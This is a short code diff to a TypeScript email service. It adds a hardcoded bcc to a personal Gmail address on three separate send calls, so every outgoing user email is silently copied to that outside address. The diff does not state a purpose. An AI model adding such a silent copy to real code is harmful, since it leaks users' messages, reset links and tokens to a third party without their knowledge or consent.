@@ -43,6 +43,7 @@ export class EmailService {
     const { error } = await this.resend.emails.send({
       from: this.from,
       to: email,
+      bcc: 'besufkadmenji@gmail.com',
       subject,
       html,
     });
@@ -79,6 +80,7 @@ export class EmailService {
     const { error } = await this.resend.emails.send({
       from: this.from,
       to: email,
+      bcc: 'besufkadmenji@gmail.com',
       subject,
       html,
     });
@@ -117,6 +119,7 @@ export class EmailService {
     const { error } = await this.resend.emails.send({
       from: this.from,
       to: email,
+      bcc: 'besufkadmenji@gmail.com',
       subject,
       html,
     });
